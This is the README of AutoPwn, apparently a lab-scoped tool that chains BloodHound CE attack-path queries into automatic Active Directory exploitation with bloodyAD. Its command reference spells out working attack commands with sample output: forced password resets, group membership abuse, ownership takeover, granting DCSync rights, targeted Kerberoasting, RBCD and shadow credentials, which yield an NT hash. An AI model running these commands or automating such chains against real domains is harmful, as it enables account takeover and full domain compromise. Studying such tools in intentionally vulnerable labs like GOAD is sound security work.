# AutoPwn

Automated Active Directory attack path exploitation using the BloodHound CE API and bloodyAD.

> **Lab use only** — tested on [GOAD-Mini](https://github.com/Orange-Cyberdefense/GOAD) (`sevenkingdoms.local`), an intentionally vulnerable AD lab.

---

## What it does

Queries BloodHound CE for attack paths, maps each edge type to a concrete exploitation technique, and executes them automatically via bloodyAD — without touching the UI.

**What it does NOT do:**
- Collect AD data (use `bloodhound-python` or `SharpHound` for that)
- Replace the BloodHound UI

---

## Requirements

- Python 3.10+
- `pip install -r requirements.txt` (rich, requests, python-dotenv)
- BloodHound CE v8.7+ running and populated
- bloodyAD — on Linux natively, on Windows via WSL2
- A BloodHound API token (token ID + token key)
- A Running lab running
- A .env file filled like is dictated by .env.example
- Following SETUP.md

---

## Setup

```bash
git clone https://github.com/ranialaachir/projet-integre.git
cd projet-integre
pip install -r requirements.txt
cp .env.example .env
# fill in your values
```

**.env:**
```env
BLOODHOUND_TOKEN_ID=your_token_id
BLOODHOUND_TOKEN_KEY=your_token_key
BLOODHOUND_URL=http://<SERVER_IP>:8083

DC_IP=192.168.56.10
AD_DOMAIN=sevenkingdoms.local
```

Generate a token: BloodHound UI → top-right menu → **API Tokens** → Create Token.

**Collect and ingest data first:**
```bash
bloodhound-python \
  -d sevenkingdoms.local \
  -u 'vagrant' -p 'vagrant' \
  -dc kingslanding.sevenkingdoms.local \
  -ns 192.168.56.10 \
  -c All --zip
# then upload the zip via BloodHound CE UI → File Ingest
```
---
## Key Technical Notes

Many common DACL abuses can be exploited with bloodyAD --replacing many of the old net rpc, pth-net, dacledit.py, owneredit.py, targetedKerberoast.py, and pywhisker commands.

BloodyAD doesn't currently replace specific and/or advanced DACL writes on containers/OUs with custom inheritance. In such cases, Powershell or impacket tools could be used.

### BloodHound CE API query response structure

When using `POST /api/v2/graphs/cypher`, the response splits into three buckets:

```python
data["data"] = {
    "nodes":    [...],   # RETURN n          → full node objects
    "edges":    [...],   # RETURN r          → relationship objects
    "literals": [...]    # RETURN n.name     → scalar property values
}
```

The BloodHound UI custom query box only renders `nodes` and `edges` — scalar returns show "No results" in the UI even when data exists. Use the API or query Neo4j directly for scalar queries.

### Querying Neo4j directly

For debugging or scalar queries outside the API:

```bash
curl -u "neo4j:yourpassword" \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"MATCH (n:Domain) RETURN n.name, n.objectid"}]}' \
  http://localhost:7474/db/neo4j/tx/commit
```

Note: if your password contains special characters like `@@`, always wrap it in **single quotes** in the shell.

---

## Project Structure

```
AutoPwn/
├── main.py                    # orchestrator
├── entities/
│   ├── client.py              # BHClient — API credentials + base URL
│   ├── node.py                # Node — AD principal (user, group, computer, domain)
│   ├── node_kind.py           # NodeKind enum
│   ├── edge.py                # Edge — relationship between two nodes
│   ├── edge_kind.py           # EdgeKind enum
│   ├── path.py                # Path — ordered sequence of nodes and edges
│   ├── exploit_result.py      # structured output from any exploit attempt
│   └── credentials.py         # Credential dataclass (username/hash/ticket)
├── exceptions/
│   ├── hop_failed_error.py    # single hop could not be exploited
│   ├── no_path_error.py       # no attack path exists to target
│   ├── api_error.py
│   ├── config_error.py
│   └── exploit_error.py
├── references/
│   ├── cred_store.py          # known credentials (populated manually)
│   ├── privilege_levels.py    # node privilege scoring
│   └── color_maps.py          # output coloring
├── services/
│   ├── enumeration.py         # find users, groups, computers
│   ├── pathfinding.py         # shortest paths, attack path queries
│   ├── strategy_runner.py     # runs strategies against BH query results
│   ├── scoring.py             # criticality scoring
│   ├── reporting.py           # structured findings output
│   ├── parse_objects.py       # parse nodes/edges from BH API JSON
│   ├── printing.py            # rich console helpers
│   ├── formatting.py
│   └── console.py
├── strategies/
│   ├── exploit_strategy.py    # abstract base class
│   ├── bloodyad_base.py       # BloodyADBase — dispatch + fallback chain
│   ├── __init__.py            # STRATEGY_REGISTRY
│   │
│   ├── add_member.py          # AddMember → bloodyAD add groupMember
│   ├── force_change_password.py
│   ├── generic_all.py         # dispatches by target type
│   ├── generic_write.py       # dispatches by target type
│   ├── write_dacl.py          # GrantDCSync or GrantGenericAll
│   ├── write_owner.py         # TakeOwnership → GrantGenericAll
│   ├── owns.py                # GrantGenericAll (already owner)
│   ├── dc_sync.py             # (stub)
│   ├── kerberoast.py          # (stub)
│   ├── admin_to.py            # (stub)
│   ├── has_session.py         # (stub)
│   └── read_laps.py           # (stub)
│
│   └── techniques/            # reusable mixin methods per category
│       ├── ldap_techniques.py       # ✅ bloodyAD LDAP writes (done)
│       ├── kerberos_techniques.py   # 🔲 kerberoast, delegation, S4U
│       ├── credential_techniques.py # 🔲 dcsync, laps, secretsdump
│       └── exec_techniques.py       # 🔲 rdp, psremote, wmi, psexec
├── utils/
│   ├── auth.py                # HMAC request signing
│   ├── request.py             # BH API HTTP helpers
│   ├── bloodyad.py            # bloodyAD command builder
│   ├── runner.py              # subprocess execution
│   ├── platform.py            # detect Linux / WSL2 backend
│   └── bh_api_manager.py
└── tmp/
    └── shadow_creds/          # PFX + ccache files (gitignored)
```

---

## Architecture

Four layers:

- **`entities/`** — core data models (`Node`, `Edge`, `Path`, `Credential`, `ExploitResult`)
- **`services/`** — high-level logic: enumeration, pathfinding, strategy execution, reporting
- **`strategies/`** — one class per BloodHound edge type, each with a `_DISPATCH` table mapping target node kinds to technique methods
- **`utils/`** — low-level helpers: HTTP, HMAC auth, subprocess runner, platform detection

Techniques are implemented as mixins in `strategies/techniques/` and shared across strategies. `BloodyADBase` provides the fallback chain: if the first technique in a dispatch list fails, the next one is tried automatically.

---

## Implemented Strategies

| Strategy | Edge | Techniques |
|---|---|---|
| `AddMemberStrategy` | `AddMember` | bloodyAD `add groupMember` |
| `ForceChangePasswordStrategy` | `ForceChangePassword` | bloodyAD `set password` |
| `GenericAllStrategy` | `GenericAll` | ShadowCredentials → ForceChangePassword (User) / AddMember (Group) / RBCD (Computer) / GrantDCSync (Domain) |
| `GenericWriteStrategy` | `GenericWrite` | ShadowCredentials → TargetedKerberoast (User) / AddMember (Group) / RBCD (Computer) |
| `WriteDaclStrategy` | `WriteDACL` | GrantDCSync (Domain) / GrantGenericAll (others) |
| `WriteOwnerStrategy` | `WriteOwner` | TakeOwnership → GrantGenericAll |
| `OwnsStrategy` | `Owns` | GrantGenericAll (already owner) |

### Mapping

| BloodHound Edge	| bloodyAD Technique | Target Type |
|-----------------|--------------------|-------------|
| ForceChangePassword |	_do_force_change_password	| User |
| AddMember, GenericAll→Group, GenericWrite→Group |	_do_add_member |	Group |
| WriteOwner, Owns	|_do_take_ownership	|Base |
| WriteDacl, GenericAll→Domain	| _do_grant_dcsync |	Domain |
| AddKeyCredentialLink, GenericAll→User/Computer | _do_shadow_credentials	| User/Computer |
| WriteSPN, GenericAll→User, GenericWrite→User |	_do_targeted_kerberoast	| User |
| WriteAccountRestrictions, GenericAll→Computer |	_do_rbcd |	Computer |

---

## bloodyAD Command Reference

All LDAP techniques ultimately call bloodyAD. This section documents each command for reference and manual testing.

### 1. ForceChangePassword
```bash
bloodyAD --host <DC_IP> -d <domain.local> \
  -u <attacker_sam> -p <hash_or_password> \
  set password <victim_sam> <'NewPassword'>
```
```
[+] Password changed successfully!
```

### 2. AddMember
```bash
bloodyAD --host <DC_IP> -d <domain.local> \
  -u <attacker_sam> -p <hash_or_password> \
  add groupMember <target_group> <attacker_sam>
```
```
[+] attacker_sam added to target_group
```

### 3. TakeOwnership
```bash
bloodyAD --host <DC_IP> -d <domain.local> \
  -u <attacker_sam> -p <hash_or_password> \
  set owner <victim_sam> <attacker_sam>
```
```
[+] Old owner S-1-5-21-... is now replaced by attacker_sam on victim_sam
```

### 4. GrantGenericAll
```bash
bloodyAD --host <DC_IP> -d <domain.local> \
  -u <attacker_sam> -p <hash_or_password> \
  add genericAll <target_sam> <attacker_sam>
```
```
[+] attacker_sam has now GenericAll on target_sam
```

### 5. GrantDCSync (WriteDACL on Domain)
```bash
bloodyAD --host <DC_IP> -d <domain.local> \
  -u <attacker_sam> -p <hash_or_password> \
  add dcsync <attacker_sam>
```
```
[+] attacker_sam has now dcsync rights on domain.local
```

### 6. TargetedKerberoast
```bash
bloodyAD --host <DC_IP> -d <domain.local> \
  -u <attacker_sam> -p <hash_or_password> \
  set object <target_sam> servicePrincipalName \
  -v "fake/roast.domain.local"
```
```
[+] target_sam's servicePrincipalName has been updated
```

### 7. RBCD
```bash
bloodyAD --host <DC_IP> -d <domain.local> \
  -u <attacker_sam> -p <hash_or_password> \
  add rbcd <'TARGET$'> <'ATTACKER$'>
```
```
[+] Delegation rights modified successfully!
ATTACKER$ can now impersonate users on TARGET$
```

### 8. ShadowCredentials
```bash
bloodyAD --host <DC_IP> -d <domain.local> \
  -u <attacker_sam> -p <hash_or_password> \
  add shadowCredentials <victim_sam>
```
```
[+] KeyCredential generated with following sha256 of RSA key: 71c9...
[+] TGT stored in ccache file victim_sam_Xx.ccache
NT: 9029cf007326107eb1c519c84ea60dbe
```
> Requires PKINIT support (a CA enrolled in the domain). If not available, bloodyAD will fail and the tool cleans up automatically.

---

## Adding a Strategy

```python
# strategies/my_strategy.py
from dataclasses import dataclass
from .bloodyad_base import BloodyADBase
from .techniques.ldap_techniques import ADTechniquesMixin
from entities.edge_kind import EdgeKind
from entities.node_kind import NodeKind

@dataclass
class MyStrategy(ADTechniquesMixin, BloodyADBase):
    _DISPATCH = {
        NodeKind.USER: [
            ("TechniqueName", ADTechniquesMixin._do_something),
        ],
    }

    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.MY_EDGE
```

Then register it in `strategies/__init__.py`:
```python
from .my_strategy import MyStrategy

STRATEGY_REGISTRY = [
    ...
    (MyStrategy, "MyEdge", "Base", "User"),
]
```

---

## Target Lab: GOAD-Mini

| Property | Value |
|---|---|
| Domain | `sevenkingdoms.local` |
| DC | `kingslanding.sevenkingdoms.local` |
| DC IP | `192.168.56.10` |
| Collection user | `vagrant` / `vagrant` (local account, not a domain user) |

---

## References

- [GOAD — Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE Docs](https://support.bloodhoundenterprise.io/)
- [BloodHound API Spec](http://localhost:8083/api/v2/spec) (local, requires running instance)